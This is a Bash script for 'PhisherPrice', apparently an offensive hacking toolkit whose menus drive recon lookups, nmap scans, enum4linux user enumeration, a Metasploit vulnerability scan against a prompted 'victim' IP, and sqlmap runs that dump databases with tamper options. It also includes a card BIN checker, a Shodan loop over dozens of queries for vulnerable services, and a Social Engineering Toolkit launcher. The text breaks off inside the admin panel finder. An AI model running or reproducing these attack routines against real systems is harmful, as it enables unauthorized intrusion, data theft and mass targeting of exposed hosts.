#!/bin/bash

##################################
# PhiserPrice version 4.1(ALPHA) #
##################################
## Developed on BackBox With <3 ##
##       By SirCryptic          ##
##################################
##################################
##        rjwdlu4eva            ##
##################################
##         Greetz To:           ## 
##################################
##     NullSecurityTeam         ##
##          M0bly               ##
##          Double A            ##
##################################
##          R1ff                ##
##          M0nde               ##
##          Jack                ##
##          Kiera               ##
##################################
##              Repo            ##
################################################
## https://github.com/SirCryptic/phisherprice ##
################################################
##             LICENSE          ##
#########################################################################
## https://github.com/SirCryptic/phisherprice/blob/re-write/LICENSE.md ##
#########################################################################
##             Changelog        ##
###########################################################################
## https://github.com/SirCryptic/phisherprice/blob/re-write/CHANGELOG.md ##
###########################################################################
##             NOTICE:          ##
################################################################################################################################################
## If you have paid for this script, please be aware that you have been scammed.                                                              ##
## This script is open source and freely available for anyone to use and modify under the terms of the license for personal use.              ##
## No one should be charging you for access to this script or claiming it as their own work.                                                  ##
## If you have any concerns or questions, please contact the original author (SirCryptic) or report the scam to the appropriate authorities.  ##
################################################################################################################################################
if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root" 
   echo "You Forgot To Say The Magic Word, bRuHhh cmon" 
   exit 1
fi
clear
echo -n "Loading Please Wait."

# API keys and other variables
phone_lookup_api_key=REPLACE_ME_WITH_YOUR_API_KEY
bin_checker_api_key=REPLACE_ME_WITH_YOUR_API_KEY
email_validator_api_key=REPLACE_ME_WITH_YOUR_API_KEY
SHODAN_API_KEY=REPLACE_ME_WITH_YOUR_API_KEY

HISTFILE="$HOME/.bash_history"
history -a "$HISTFILE"

if [[ $- == *i* ]]; then
    bind '"\e[A": history-search-backward'
    bind '"\e[B": history-search-forward'
    bind '"\e[C": forward-char'
    bind '"\e[D": backward-char'
fi
history -r
history -a
history -w
# Set the terminal size
echo "${green}Setting terminal size...${reset}"
resize -s 50 150
# Set up color variables
black=`tput setaf 0`
red=`tput setaf 1`
green=`tput setaf 2`
yellow=`tput setaf 3`
blue=`tput setaf 4`
magenta=`tput setaf 5`
cyan=`tput setaf 6`
white=`tput setaf 7`
reset=`tput sgr0`
colors=(
    "$(tput setaf 0)"
    "$(tput setaf 1)"
    "$(tput setaf 2)"
    "$(tput setaf 3)"
    "$(tput setaf 4)"
    "$(tput setaf 5)"
    "$(tput setaf 6)"
    "$(tput setaf 7)"
    "$(tput sgr0)"
)
banner_files=(
    "/usr/local/bin/phisherprice/main/banners/banner1.txt"
    "/usr/local/bin/phisherprice/main/banners/banner2.txt"
    "/usr/local/bin/phisherprice/main/banners/banner3.txt"
    "/usr/local/bin/phisherprice/main/banners/banner4.txt"
    "/usr/local/bin/phisherprice/main/banners/banner5.txt"
    "/usr/local/bin/phisherprice/main/banners/banner6.txt"
)
title="PhisherPrice"
echo -e '\033]2;'$title'\007'

ACPbanner="
${cyan}  ___  _____ ______${magenta}______ 
${cyan} / _ \/  __ \| ___ \ ${magenta} ___|
${cyan}/ /_\ \ /  \/| |_/ /${magenta} |_   
${cyan}|  _  | |    |  __/${magenta}|  _|  
${cyan}| | | | \__/\| |   ${magenta}| |    
${cyan}\_| |_/\____/\_|   ${magenta}\_|    
${cyan}Admin Control Panel ${magenta}Finder ${yellow}[BETA]
${magenta}Developed By ${cyan}NullSecurityTeam${reset}
${magenta}Revised By ${cyan}SirCryptic@NullSecurityTeam${reset}
"
# Parse the command-line arguments
while getopts "b" opt; do
  case $opt in
    b)
      show_banner=true
      ;;
    \?)
      echo "Invalid option: -$OPTARG" >&2
      ;;
  esac
done

# Select a random banner file if banners are enabled
if [ "$show_banner" = true ]; then
  selected_banner=${banner_files[RANDOM % ${#banner_files[@]}]}
fi

# Select a random color
random_color=$((RANDOM % 8))
color=${colors[$random_color]}
# Main menu function
main_menu() {
  while true
  do
  clear
  # Print the banner with the selected color if banners are enabled
  if [ "$show_banner" = true ]; then
    cat "$selected_banner" | sed "s/.*/${color}&${colors[8]}/"
  fi
echo -e "
┌───────────────────────────────────────┐
│${red}Main Menu${reset}                              │
├───────────────────────────────────────┤
│${green}1${reset} │Recon                               │
│${green}2${reset} │Cracking                            │
│${green}3${reset} │AutoxSploits                        │
│${green}4${reset} │Networking                          │
│${green}5${reset} │C.Y.O xSploits                      │
│${green}6${reset} │AutoExif                            │  
│${green}7${reset} │SE Toolkit                          │
│${green}8${reset} │Start Th3inspector                  │
│${green}u${reset} │Update Script                       │
│${green}c${reset} │Contact Information                 │
├───────────────────────────────────────┤
│            q/Q To Exit                │
"├$blue["$red"PhisherPrice$blue]$reset──$blue[$red~$blue]$reset──$blue["$yellow"ToolSet$blue]:"$reset────────┘"
read -r -p"└─────► $reset" choice
    case $choice in
      1)
        submenu1
        ;;
      2)
        submenu2
        ;;
      3)
        submenu3
        ;;
      4)
        submenu4
        ;;
      5)
        submenu5
        ;;
      6)
        submenu6
        ;;
      7)
clear
echo "Are you sure you want to start SE Toolkit?"
read -p "Press Y to confirm or any other key to cancel." confirm

if [[ "$confirm" =~ ^([yY][eE][sS]|[yY])$ ]]; then
  clear
  echo -e "\n**************************************************"
  echo "******  ${green}Starting${reset} Social Engineering Toolkit... ******"
  echo -e "**************************************************\n"
  
  if sudo setoolkit; then
    clear
    echo -e "\n**************************************************"
    echo "******          SET has been ${red}closed${reset}         ******"
    echo -e "**************************************************\n"
  else
    clear
    echo -e "\n**************************************************"
    echo "******        ${red}Error${reset} running SET...         ******"
    echo "******  Please check your installation.   ******"
    echo -e "**************************************************\n"
  fi

else
  clear
  echo -e "\n**************************************************"
  echo "******        ${red}Operation cancelled.${reset}         ******"
  echo -e "**************************************************\n"
fi
        ;;
      8)
clear

echo "Are you sure you want to start Th3inspector?"
read -p "Press Y to confirm or any other key to cancel." confirm

if [[ "$confirm" =~ ^([yY][eE][sS]|[yY])$ ]]; then
    clear
    echo -e '\n**************************************************'
    echo "******      ${green}Loading${reset} Th3inspector...     ******"
    echo -e '**************************************************\n'

    Th3inspector

    clear
    echo -e '\n**************************************************'
    echo "******    Th3inspector has been ${red}closed.${reset}  ******"
    echo -e '**************************************************\n'
else
    clear
    echo -e '\n**************************************************'
    echo "******         ${red}Operation cancelled.${reset}        ******"
    echo -e '**************************************************\n'
fi
        ;;
      u|U)
    clear
    echo "${green}Updating Phisherprice...${reset}"
    REPO_URL="https://github.com/sircryptic/phisherprice.git"
    INSTALL_DIR="/usr/local/bin/phisherprice"

    echo "${yellow}Cloning latest release...${reset}"
    git clone $REPO_URL $INSTALL_DIR.new || { echo "Failed to clone latest release"; exit 1; }

    if [ -d $INSTALL_DIR.old ]; then
        echo "${yellow}Removing old version...${reset}"
        sudo rm -rf $INSTALL_DIR.old || { echo "${red}Failed to remove old version${reset}"; exit 1; }
    fi

    if [ -d $INSTALL_DIR ]; then
        echo "${yellow}Backing up current version...${reset}"
        sudo mv $INSTALL_DIR $INSTALL_DIR.old || { echo "${red}Failed to move current version to backup${reset}"; exit 1; }
    fi

    echo "${green}Installing latest version...${reset}"
    sudo mv $INSTALL_DIR.new $INSTALL_DIR || { echo "${red}Failed to install latest version${reset}"; exit 1; }

    echo "${yellow}Making $INSTALL_DIR/phisherprice.sh executable...${reset}"
    sudo chmod +x $INSTALL_DIR/phisherprice.sh || { echo "${red}Failed to make phisherprice.sh executable${reset}"; exit 1; }

    echo "${yellow}Creating symbolic link for phisherprice.sh as pp...${reset}"
    if [ -L /usr/local/bin/pp ]; then
        echo "${yellow}Removing old symbolic link...${reset}"
        sudo rm /usr/local/bin/pp || { echo "${red}Failed to remove old symbolic link${reset}"; exit 1; }
    fi
    sudo ln -s $INSTALL_DIR/phisherprice.sh /usr/local/bin/pp || { echo "${red}Failed to create symbolic link${reset}"; exit 1; }

    echo "${green}Update complete!${reset}"

    echo "${yellow}Restarting Phisherprice${reset} (${green}now accessible via 'pp'${reset})..."
    sudo pp || { echo "${red}Failed to restart Phisherprice${reset}"; exit 1; }
        ;;
      c|C)
clear

echo -e "${Yellow}If you have any issues, feel free to ${green}file a bug report${reset} on GitHub @ https://github.com/sircryptic/phisherprice${reset}"
echo -e "\e[1;34mI would personally like to thank \e[1;35mJack \e[1;34mover at \e[1;32mKali Hacking Community Discord Server\e[1;34m for being my motivation to keep making this tool. Sadly, this tool is no longer going to be updated much longer, and the original KHC community sank. Farewell to all those I personally knew.\nI would also like to thank \e[1;35mKiera<3 \e[1;34mover @KCH \e[1;34mfor making me aware of bugs. Without people like this, I probably would have been oblivious. So thank you once again to all those that made this possible and gave me inspiration.\n- \e[1;31mSirCryptic \e[1;31m\n"
        ;;
	q|Q)
	clear
	echo "${red}Exiting PhisherPrice.${green} Goodbye!${reset}"
	exit 0
  ;;
      *)
        echo "Invalid option: $choice"
        ;;
    esac
    echo ""
    read -p "Press enter to continue...${reset}"
  done
}

# Submenu 1 function
submenu1() {
  while true
  do
	clear
echo -e "
┌────────────────────────────────────────────┐
│${red}Recon & Auditing${reset}                            │
├────────────────────────────────────────────┤
│${green}1${reset}  │Whois Info                              │
│${green}2${reset}  │Geo IP                                  │
│${green}3${reset}  │IP Lookup                               │
│${green}4${reset}  │DNS Lookup                              │
│${green}5${reset}  │Reverse DNS Lookup                      │
│${green}6${reset}  │Shared DNS Lookup                       │
│${green}7${reset}  │Nmap Scan (w/OS Detection)              │
│${green}8${reset}  │SSH Scanner (Scan for weak cyphers)     │
│${green}9${reset}  │SSL/TLS Scanner (Scan for weak cyphers) │
│${green}10${reset} │Retreive HTTP Headers                   │
│${green}11${reset} │Autonomous System Lookup (AS/ASN/IP)    │
│${green}12${reset} │Banner Grab                             │
│${green}13${reset} │Extract All Links From Host             │
│${green}14${reset} │Phone Number Lookup                     │
│${green}15${reset} │Reverse Analytics                       │
│${green}16${reset} │Get Server Users                        │
│${green}17${reset} │SQL Map                                 │
│${green}18${reset} │SQL Map (Quick/Deep)                    │
│${green}19${reset} │Scan For Vulns (Metasploit)             │
│${green}20${reset} │BIN Checker                             │
│${green}21${reset} │Email Validator                         │
│${green}22${reset} │Scan Shodan for vulnrable IOT Devices   │
│${green}23${reset} │Admin Control Panel Finder [BETA]       │
├────────────────────────────────────────────┤
│    b/B To Go To Back ~ q/Q To Exit         │
"├$blue["$red"PhisherPrice$blue]$reset──$blue[$red~$blue]$reset──$blue["$yellow"Recon/Auditing$blue]:"$reset──────┘"
read -r -p"└─────► $reset" choice
    case $choice in
        1)
        clear
echo "Enter website domain:"
read -e domain
history -a
echo "$domain" >> ~/.bash_history
echo -e "\n----------------------------------------"
echo "Gathering Information About Host:"

echo "-------------------------------"

response=$(whois $domain)

if [[ -z $response || $response == *"No match for"* || $response == *"NOT FOUND"* ]]; then
  echo "Error: Domain $domain not found"
else
  echo -e "\n----------------------------------------"
  echo "Domain Information"
  echo "----------------------------------------"
  echo -e "$response"
  
  echo -e "\nDo you want to save the information to a file? (y/n)"
  read -e saveToFile
  if [[ $saveToFile == "y" ]]; then
    echo -e "$response" > "$domain.txt"
    echo "Information saved to file: $domain.txt"
  fi
fi
        ;;
        2)
        clear
echo -e "Geo IP Lookup" 
echo "Enter IP or Domain:"
read -e subop3
history -a

echo -e "\n-------------------------------"
echo "Getting Geo IP Information for:"
echo "$subop3" >> ~/.bash_history
echo "-------------------------------"

response=$(curl -s "https://api.hackertarget.com/geoip/?q=$subop3")

if [[ -z $response || $response == *"error"* ]]; then
  echo "Error: Failed to retrieve Geo IP information for $subop3"
else
  echo -e "\n-----------------------------"
  echo "Geo IP Information Found"
  echo "-----------------------------"
  echo -e "$response"
fi
        ;;
        3)
        clear
echo -e "Reverse IP Lookup"  
echo "Enter IP or Domain:"
read -e subop4
history -a
echo -e "\n-------------------------------"
echo "Getting IP Information for:"
echo "$subop4" >> ~/.bash_history
echo "-------------------------------"

response=$(curl -s "http://api.hackertarget.com/reverseiplookup/?q=$subop4")

if [[ -z $response || $response == *"error"* ]]; then
  echo "Error: Failed to retrieve reverse IP information for $subop4"
else
  echo -e "\n-----------------------------"
  echo "Reverse IP Information Found"
  echo "-----------------------------"
  echo -e "$response"
fi

        ;;
        4)
        clear
echo -e "DNS Lookup"  
echo "Enter IP Address, IP Range or Domain Name:"
read -e subop5
history -a
echo -e "\n-------------------------------"
echo "Getting DNS Information for:"
echo "$subop5" >> ~/.bash_history
echo "-------------------------------"

response=$(curl -s "http://api.hackertarget.com/dnslookup/?q=$subop5")
if [[ -z $response || $response == *"error"* ]]; then
  echo "Error: Failed to retrieve DNS information for $subop5"
else
  echo -e "\n-----------------------------"
  echo "DNS Information Found"
  echo "-----------------------------"
  echo -e "$response"
fi

        ;;
        5)
        clear
echo -e "Reverse DNS Lookup" 
echo "Enter IP or domain:"
read -e subop6
history -a
echo -e "\n-------------------------------"
echo "Getting DNS information for:"
echo "$subop6" >> ~/.bash_history
echo "-------------------------------"

response=$(curl -s "https://api.hackertarget.com/reversedns/?q=$subop6")

if [[ -z $response || $response == *"error"* ]]; then
  echo "Error: Failed to retrieve DNS information for $subop6"
else
  echo -e "\n-----------------------------"
  echo "DNS Information Found"
  echo "-----------------------------"
  echo -e "$response"
fi

        ;;
        6)
        clear
echo -e "Shared DNS Finder" 
echo "Enter IP Or Domain."
read -e subop7
history -a
echo -e "\n-------------------------------"
echo "Finding Shared DNS Servers for:"
echo "$subop7" >> ~/.bash_history
echo "-------------------------------"

response=$(curl -s "https://api.hackertarget.com/findshareddns/?q=$subop7")

if [[ -z $response || $response == *"error"* ]]; then
  echo "Error: Failed to retrieve shared DNS servers for $subop7"
else
  echo -e "\n-------------------------------"
  echo "Shared DNS Servers Found"
  echo "-------------------------------"
  echo -e "$response"

  read -p "Do you want to save the results to a file? (y/n) " save_to_file
  if [[ $save_to_file == "y" || $save_to_file == "Y" ]]; then
    read -p "Enter a filename to save the results to: " filename
    echo -e "$response" > "$filename"
    echo "Results saved to $filename"
  fi
fi
        ;;
        7)
        clear
echo -e "NMAP Scan w/OS Detection"
echo "Enter IP Or Domain."
read -e subop8 
history -a
echo -e "$subop8" >> ~/.bash_history

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!!!!   Getting Open Ports     !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

nmap_output=$(sudo nmap -p- --open -O $subop8)

if [[ $nmap_output == *"0 hosts up"* ]]; then
  echo "No open ports found."
else
  echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!    Open Ports Found Using nmap     !!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'
  echo "$nmap_output"
fi
        ;;
        8)
        clear
function scan_ciphers() {
  host="$1"
  port="$2"

  printf "Testing available ciphers on %s:%s...\n" "$host" "$port"
  printf "\n\033[1;33mTesting for weak ciphers...\033[0m\n"

  openssl ciphers -v | awk '{print $1}' | while read cipher; do
    openssl s_client -cipher "$cipher" -connect "$host:$port" >/dev/null 2>&1 && echo -e "Cipher \033[1;32m$cipher is enabled\033[0m" || echo -e "Cipher \033[1;31m$cipher is disabled\033[0m"
  done | grep -i -E "NULL|RC4|DES|3DES|MD5|SHA-1"

  printf "\n\033[1;33mTesting for strong ciphers...\033[0m\n"

  openssl ciphers -v | awk '{print $1}' | while read cipher; do
    openssl s_client -cipher "$cipher" -connect "$host:$port" >/dev/null 2>&1 && echo -e "Cipher \033[1;32m$cipher is enabled\033[0m" || echo -e "Cipher \033[1;31m$cipher is disabled\033[0m"
  done | grep -v -E "NULL|RC4|DES|3DES|MD5|SHA-1"

  printf "\n\033[1;33mTesting for weak MACs...\033[0m\n"

  openssl s_client -connect "$host:$port" -tls1_2 -cipher AES256-SHA >/dev/null 2>&1 && echo -e "\033[1;32mHMAC-SHA256 is enabled\033[0m" || echo -e "\033[1;31mHMAC-SHA256 is disabled\033[0m"
  openssl s_client -connect "$host:$port" -tls1_2 -cipher AES128-SHA >/dev/null 2>&1 && echo -e "\033[1;32mHMAC-SHA1 is enabled\033[0m" || echo -e "\033[1;31mHMAC-SHA1 is disabled\033[0m"

  printf "\n\033[1;33mTesting for key exchange methods...\033[0m\n"

  openssl s_client -connect "$host:$port" -tls1_2 -cipher AES256-SHA >/dev/null 2>&1 && echo -e "\033[1;32mECDHE key exchange is enabled\033[0m" || echo -e "\033[1;31mECDHE key exchange is disabled\033[0m"
  openssl s_client -connect "$host:$port" -tls1_2 -cipher AES256-SHA >/dev/null 2>&1 && echo -e "\033[1;32mDHE key exchange is enabled\033[0m" || echo -e "\033[1;31mDHE key exchange is disabled\033[0m"

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!   Host Scanned Using PhiserPrice     !
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'
}
echo -e "SSH Scanner"
echo -e "Enter host: "
read -e host
history -a
echo -e "Enter port: "
read -e port

scan_ciphers "$host" "$port"
        ;;
        9)
        clear
echo "Enter the host you want to scan (e.g. testsite.com):"
read -e host
echo "Enter the host port you want to scan (e.g. 443):"
read -e port
clear
echo"$host" >> ~/.bash_history
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!   Scanning host SSL/TLS for vulns   !
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

response=$(echo | openssl s_client -connect "$host:$port" 2>/dev/null | openssl x509 -text)

if [[ -z $response || $response == *"unable to"* ]]; then
  echo "Error: Failed to retrieve SSL/TLS information for $host:$port"
else
  echo -e "\n-----------------------------"
  echo "${yellow}SSL/TLS Information${reset}"
  echo "-----------------------------"
  echo -e "$response"

  if [[ $response == *"heartbleed"* ]]; then
    echo -e "\n-----------------------------"
    echo "Heartbleed Vulnerability ${green}Detected${reset}!"
    echo "-----------------------------"
  fi
fi

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!   Host scanned using PhiserPrice     !
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

echo "Do you want to save the output to a text file? (y/n)"
read -e save_option

if [[ $save_option == "y" || $save_option == "Y" ]]; then
  echo -e "\nSaving output to file...\n"
  echo "Host: $host" > ssl_scan_results.txt
  echo "Port: $port" >> ssl_scan_results.txt
  echo -e "-----------------------------\nSSL/TLS Information\n-----------------------------\n$response" >> ssl_scan_results.txt
  echo -e "\n-----------------------------\nHeartbleed Vulnerability Detected!\n-----------------------------" >> ssl_scan_results.txt
  echo -e "\nScan complete. Results saved to ssl_scan_results.txt"
else
  echo "Scan complete."
fi

        ;;
        10)
        clear
echo -e "HTTP Header Scan"
echo "Enter the host you want to scan:"
read -e subop11
history -a
echo -e "\n-------------------------------"
echo "Checking HTTP Headers for:"
echo "$subop11"  >> ~/.bash_history
echo "-------------------------------"

status=$(curl -sI $subop11 | head -n 1 | cut -d' ' -f2)

if [[ $status != "200" ]]; then
  echo "Error: Failed to retrieve HTTP headers for $subop11 (Status Code: $status)"
else
  echo -e "\n------------------------------"
  echo "HTTP Headers for $subop11"
echo "$subop11"
echo "-------------------------------"
  curl -sI $subop11
fi

        ;;
        11)
        clear
echo -e "ASN Lookup"  
echo "Enter the ASN you want to scan:"
echo "Example usage: 1.1.1.1 / AS15169"
read -e subop12
history -a
echo -e "\n-------------------------------"
echo "Scanning host for ASN:"
echo "$subop12"  >> ~/.bash_history
echo "-------------------------------"

response=$(curl -s https://api.hackertarget.com/aslookup/?q=$subop12)

if [[ -z $response ]]; then
  echo "Error: Failed to retrieve ASN information for $subop12"
else
  echo -e "\n------------------------------"
  echo "ASN Information for $subop12"
  echo "------------------------------"
  echo -e "$response"
fi

echo -e "\n------------------------------"
echo "Host scanned using PhiserPrice"
echo "------------------------------"

        ;;
        12)
        clear
echo -e "Banner Grab" 
echo "Enter the IP address or domain name you want to scan:"
read -e subop13
history -a
echo -e "\n-----------------------------------"
echo "Scanning host information for:"
echo "$subop13"  >> ~/.bash_history
echo "-----------------------------------"

response=$(curl -sS https://api.hackertarget.com/bannerlookup/?q="$subop13")

if [[ -z $response ]]; then
  echo "Error: Failed to retrieve host information for $subop13"
else
  echo -e "\n---------------------------"
  echo "Host Information for $subop13"
  echo "---------------------------"
  echo -e "$response"
fi
        ;;
        13)
        clear
echo -e "Link Sniffer"
echo "This can reveal social media pages, etc."
echo "Enter domain name:"
read -e domain
history -a
echo -e "\n-----------------------------"
echo "Extracting host links for:"
echo "$domain"  >> ~/.bash_history
echo "-----------------------------"

result=$(curl -s https://api.hackertarget.com/pagelinks/?q=$domain)

if [[ -z $result ]]; then
  echo "Error: Failed to retrieve host links for $domain"
else
  echo -e "\n-----------------------------"
  echo "Host links for $domain:"
  echo "-----------------------------"
  echo -e "$result"

  read -p "Save results to a file? (Y/N): " save_results

  if [[ $save_results == "Y" || $save_results == "y" ]]; then
    echo -e "$result" > "${domain}_pagelinks.txt"
    echo "Results saved to ${domain}_pagelinks.txt"
  fi
fi

echo -e "\n-----------------------------"
echo "Host links extraction completed using PhisherPrice!"
echo "-----------------------------"
        ;;
        14)
        clear
echo -e "Phone Number Lookup"
echo "Please Enter The Number Followed By The Dialing Code"
echo "for example : +447410490080 / +44 Is My Dialing Code"
read -e subop15
history -a

echo -e "\n-----------------------------"
echo "Looking Up Info About The Number:"
echo "$subop15"  >> ~/.bash_history
echo "-----------------------------"
curl --request GET "https://api.apilayer.com/number_verification/validate?number=$subop15" \
--header "apikey: $phone_lookup_api_key"

echo -e "\n-----------------------------"
echo "Phone Info Found Using PhisherPrice"
echo "-----------------------------"
        ;;
        15)
        clear
echo -e "Reverse Analytics Lookup"  
echo "Find Domains Using Same Google Ad-Sense ID"
echo "Enter Domain Name Or GA-ID"
echo "For example: UA-11223344 or testsite.com"
read -e subop16
history -a
echo -e '\n----------------------------------'
echo "Retrieving Hosts/GA-ID for:"
echo "subop16"  >> ~/.bash_history
echo '----------------------------------'

result=$(curl -s https://api.hackertarget.com/analyticslookup/?q=$subop16)

if [[ $result == "error check your search parameter" ]]; then
  echo "Error: Invalid search parameter $subop16"
else
  echo -e "\n----------------------------------"
  echo "Host Info Found for $subop16"
  echo '----------------------------------'
  echo -e "$result"
fi

echo -e '\n----------------------------------'
echo "Hosts/GA-ID retrieved using PhisherPrice"
echo '----------------------------------'
        ;;
        16)
        clear
echo -e "User Search"
echo "Enter Domain Name Or IP:"
read -e subop17
history -a
echo -e "\n-----------------------------"
echo "Retrieving Host Users for:"
echo "$subop17" >> ~/.bash_history
echo "-----------------------------"
users=$(enum4linux -M -G -P -S -U $subop17)

if [[ -z "$users" ]]; then
  echo -e "\n-----------------------------"
  echo "No Host Users Found for:"
  echo "$subop17"
  echo "-----------------------------"
else
  echo -e "\n-------------------------------------------"
  echo 'Host Users Retrieved Successfully'
  echo '-------------------------------------------'
  echo "$users"
fi

read -p "Would you like to save the output to a text file? [y/N] " save_output
if [[ $save_output =~ ^[Yy]$ ]]; then
  echo "$users" > enum4linux_output.txt
  echo "Output saved to enum4linux_output.txt"
fi

        ;;
        17)
        clear
echo -e "SQL Mapper"
echo "Enter Domain Name Or IP:"
read -e sql1
history -a
echo "Database Type If You Know It, If Not Leave This Blank"
echo "Press Enter If You're Unsure"
read -e db

echo "Level of tests to perform (1-5, default 1)"
read -e levelt

echo "Risk of tests to perform (1-3, default 1)"
read -e risksl

echo "SQL injection techniques to use (default: BEUSTQ)"
echo "Press Enter To Leave Default"
read -e techskill

echo -e "\n-----------------------------"
echo "Auditing Host SQL Info for:"
echo "$sql1" >> ~/.bash_history
echo "-----------------------------"
sqlmap --dbms="$db" --forms --crawl=2 --level="${levelt:-1}" --risk="${risksl:-1}" --random-agent --all --technique="${techskill:-BEUSTQ}" -u "$sql1"

if [[ $? -eq 0 ]]; then
  echo -e '\n-------------------------------------------'
  echo 'SQL Audit Conducted Successfully'
  echo '-------------------------------------------'

  read -p "Press enter to continue."
else
  clear
  echo -e '\n-------------------------------------------'
  echo 'Failed to Conduct SQL Audit'
  echo '-------------------------------------------'
fi
        ;;
        18)
        clear
echo -e "SQL Brute Force"
echo "Enter Website"
read -e sqlhost2
echo "php or html ?"
read -e phphtml1

output=$(sqlmap -u $sqlhost2 searchgetby_id.$phphtml1?id=4 --dbs --columns -D scanme --tamper=space2comment --level 5)

if [[ $output == *"available databases"* ]]; then
  echo "Database information retrieved successfully:"
  echo "$output"
else
  echo "No database information retrieved. Please check your input and try again."
fi
        ;;
        19)
        clear
echo -e '\e[1;33mMSPLOIT VULN SCANNER\e[0m'
echo -e "\n-------------------------------------------"
echo -e "\e[1;36mEnter Victim's IP:\e[0m"
read -e victim_ip

echo -e "\n\e[1;36m------------------------------\e[0m"
echo -e "\e[1;36mRunning nmap with vuln script...\e[0m"
echo -e "\e[1;36m------------------------------\e[0m"

# start spinner animation
spinner="/-\|"
while true; do
  for i in $(seq 0 3); do
    echo -ne "\rScanning $victim_ip... ${spinner:$i:1}"
    sleep 0.1
  done
done &

# run command and save output
output=$(msfconsole -q -x "nmap -v --script vuln $victim_ip ;exit ;" 2>&1)

# stop spinner animation
kill "$!" >/dev/null 2>&1

if echo "$output" | grep -q "VULNERABLE"; then
  echo -e "\n\e[1;31m-------------------------------------------\e[0m"
  echo -e "\e[1;31mVulnerabilities Found:\e[0m"
  echo -e "$output"
  echo -e "\e[1;31m-------------------------------------------\e[0m"
else
  clear
  echo -e "\n\e[1;32m-------------------------------------------\e[0m"
  echo -e "\e[1;32mNo vulnerabilities found.\e[0m"
  echo -e "\n\e[1;32m-------------------------------------------\e[0m"
fi

        ;;
        20)
        clear
echo -e '\e[1;33m
BIN Checker \e[1;34m
'
echo "Enter The BIN Number:"
read -e r

curl --request GET \
    --url https://bank-card-bin-num-check.p.rapidapi.com/api/v1/bins/b/$r \
    --header "X-RapidAPI-Host: bank-card-bin-num-check.p.rapidapi.com" \
    --header "X-RapidAPI-Key:$bin_checker_api_key"
echo ' '
        ;;
        21)
        clear
echo -e '\e[1;33m
Email Validator \e[1;34m
'
echo "Enter the email address to verify:"

read -e email

curl --location --request GET "https://api.apilayer.com/email_verification/${email}" \
--header "apikey: ${email_validator_api_key}"
echo ' '
        ;;
        22)
        clear
echo "Shodan Vulnrability Search${reset}"

OUTPUT_FILE="shodan_results_$(date +%Y%m%d_%H%M%S).txt"

QUERIES=("title:"webcam" port:554")
QUERIES+=("product:"Apache httpd" version:<2.4.29")
QUERIES+=("product:"Microsoft-IIS"")
QUERIES+=("product:"OpenSSH"")
QUERIES+=("product:"OpenSSH" version:<7.4")
QUERIES+=("product:"nginx"")
QUERIES+=("product:"phpMyAdmin"")
QUERIES+=("product:"Samba"")
QUERIES+=("product:"MySQL"")
QUERIES+=("product:"MySQL" port:3306")
QUERIES+=("product:"PostgreSQL"")
QUERIES+=("product:"Elasticsearch"")
QUERIES+=("product:"MongoDB"")
QUERIES+=("product:"Redis"")
QUERIES+=("product:"Rsync"")
QUERIES+=("product:"Hadoop"")
QUERIES+=("product:"Zookeeper"")
QUERIES+=("product:"Elasticsearch"")
QUERIES+=("product:"RabbitMQ"")
QUERIES+=("port:3389 has_screenshot:true")
QUERIES+=("port:22 product:"OpenSSH" version:<7.4")
QUERIES+=("port:1433 country:US product:"Microsoft SQL Server"")
QUERIES+=("port:21 product:"ProFTPD" version:<1.3.5")
QUERIES+=("port:445 os:Windows")
QUERIES+=("port:161 product:"SNMP"")
QUERIES+=("product:"D-Link Web Management"")
QUERIES+=("product:"nginx" version:<1.16.1")
QUERIES+=("product:"nginx" version:<1.19.4")
QUERIES+=("product:"PHP" version:<7.2")
QUERIES+=("product:"PHP" version:<7.3")
QUERIES+=("port:22 has_ipv6:true")
QUERIES+=("product:"Docker" port:2375")
QUERIES+=("product:"Microsoft Exchange Server 2013"")
QUERIES+=("product:"Microsoft Exchange Server 2016"")
QUERIES+=("product:"Microsoft SQL Server" port:1433")
QUERIES+=("product:"MongoDB" port:27017")
QUERIES+=("product:"Elasticsearch" port:9200")
QUERIES+=("product:"Docker" port:2375")
QUERIES+=("product:"Cisco ASA"")
QUERIES+=("product:"Juniper" port:22")
QUERIES+=("product:"HP iLO"")
QUERIES+=("product:"Supermicro IPMI"")
QUERIES+=("product:"NETGEAR ProSafe"")
QUERIES+=("product:"QNAP"")
QUERIES+=("product:"OpenSSH" version:<7.6")
QUERIES+=("product:"OpenSSL" version:<1.0.2")
QUERIES+=("product:"Exim" version:<4.92")
QUERIES+=("product:"nginx" version:<1.16.1")
QUERIES+=("product:"MongoDB" port:27017")
QUERIES+=("product:"Elasticsearch" port:9200")
QUERIES+=("product:"Apache Tomcat" version:7.0.0")
QUERIES+=('port:389 os:"Windows Server 2016"')
QUERIES+=('port:3389 os:"Windows 10"')
QUERIES+=("product:\"elasticsearch\" port:9200")
QUERIES+=("product:\"mongodb\" port:27017")
QUERIES+=("product:\"rabbitmq\" port:5672")
QUERIES+=("product:\"activemq\" port:8161")
QUERIES+=("port:6379 \"redis\"")
QUERIES+=("product:\"neo4j\" port:7474")

read -p "Do you want to start the search? (y/n) " answer
if [ "$answer" != "y" ]; then
    return
fi
for QUERY in "${QUERIES[@]}"
do
    echo "Searching for: $QUERY"
    curl -s "https://api.shodan.io/shodan/host/search?key=$SHODAN_API_KEY&query=$QUERY" | jq 'try (.matches | .[] | {product, ip_str}) catch "API error: $QUERY"' | sed 's/"//g' >> $OUTPUT_FILE
done    
echo ""
echo "Scanning finished saved to $OUTPUT_FILE"
echo ' '
        ;;
      23)
        clear
# Define the URL prefix
url_prefix="http://"

# Read the user agents from the file
user_agents=$(cat main/user_agents.txt)
# Clear the cli
clear

echo -e "${ACPbanner}"

# Prompt the user for the domain name
read -e -p "Enter the domain name to check: " domain  && echo "$domain" >> ~/.bash_history 2>/dev/null

